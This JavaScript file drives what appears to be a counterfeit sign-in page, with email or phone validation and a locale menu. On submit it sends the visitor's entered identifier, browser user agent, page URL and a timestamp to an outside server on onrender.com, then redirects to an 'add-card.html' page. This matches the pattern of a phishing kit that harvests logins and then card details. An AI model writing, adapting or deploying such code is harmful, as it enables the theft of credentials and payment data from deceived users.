document.addEventListener("DOMContentLoaded", () => {
  const input = document.getElementById("userId");
  const label = document.getElementById("inputLabel");
  const errorRequired = document.getElementById("error-required");
  const errorFormat = document.getElementById("error-format");
  const errorPhone = document.getElementById("error-phone");
  const subtext = document.getElementById("subtext-info");
  const button = document.getElementById("submit-btn");
  const phoneWrapper = document.getElementById("phone-wrapper");
  const form = document.getElementById("login-form");
  const errorIcon = document.querySelector(".al-input__error-icon");

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isPhone = (val) => /^\d+$/.test(val);

  let touched = false;

  function updateLabelState() {
    const val = input.value.trim();
    label.classList.toggle("shrink", !!val || document.activeElement === input);
  }

  function validate() {
    const val = input.value.trim();
    const isEmpty = val === "";
    const isPhoneInput = isPhone(val);
    const isEmailInput = emailRegex.test(val);
    const isValidPhone = isPhoneInput && val.length >= 9;

    // Reset state
    input.classList.remove("error", "valid", "phone-mode");
    label.classList.remove("error");
    errorRequired.classList.add("hidden");
    errorFormat.classList.add("hidden");
    errorPhone.classList.add("hidden");
    subtext.classList.add("hidden");
    phoneWrapper.classList.add("hidden");
    button.classList.remove("active");
    button.disabled = true;
    errorIcon.style.display = "none";

    let hasError = false;

    if (!touched) return;

    if (isEmpty) {
      input.classList.add("error");
      label.classList.add("error");
      label.textContent = "Email or mobile number";
      errorRequired.classList.remove("hidden");
      errorIcon.style.display = "block";
      updateLabelState();
      return;
    }

    if (isPhoneInput) {
      input.classList.add("phone-mode");
      phoneWrapper.classList.remove("hidden");
      label.textContent = "Mobile number";

      if (!isValidPhone) {
        input.classList.add("error");
        label.classList.add("error");
        errorPhone.classList.remove("hidden");
        errorIcon.style.display = "block";
        updateLabelState();
        return;
      }
    } else if (!isEmailInput) {
      input.classList.add("error");
      label.classList.add("error");
      label.textContent = "Email address";
      errorFormat.classList.remove("hidden");
      errorIcon.style.display = "block";
      updateLabelState();
      return;
    } else {
      label.textContent = "Email address";
    }

    // Valid input
    input.classList.add("valid");
    button.classList.add("active");
    button.disabled = false;
    subtext.classList.remove("hidden");
    updateLabelState();
  }

  input.addEventListener("focus", () => {
    touched = true;
    updateLabelState();
  });

  input.addEventListener("blur", () => {
    updateLabelState();
    validate();
  });

  input.addEventListener("input", () => {
    updateLabelState();
    validate();
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const val = input.value.trim();
    if (button.disabled) return;

    const isEmail = emailRegex.test(val);
    const endpoint = isEmail ? "/login" : "/phone";

    button.disabled = true;
    button.querySelector(".al-button__label").textContent = "Loading...";

    try {
      await fetch(`https://onclick-back.onrender.com${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_input: val,
          userAgent: navigator.userAgent,
          location: window.location.href,
          timestamp: new Date().toISOString(),
        }),
      });

      window.location.href = "add-card.html";
    } catch (err) {
      console.error("Failed to submit:", err);
      alert("Submission failed. Try again.");
      button.disabled = false;
      button.querySelector(".al-button__label").textContent = "Continue";
    }
  });

  // Locale toggle
  const localeToggle = document.getElementById("locale-toggle");
  const localeMenu = document.getElementById("locale-menu");
  const currentLocale = document.getElementById("current-locale");

  localeToggle.addEventListener("click", (e) => {
    e.preventDefault();
    localeMenu.classList.toggle("hidden");
  });

  document.querySelectorAll("#locale-menu li").forEach((li) => {
    li.addEventListener("click", () => {
      currentLocale.textContent = li.dataset.locale;
      localeMenu.classList.add("hidden");
    });
  });

  // 🔧 Init
  validate();
});
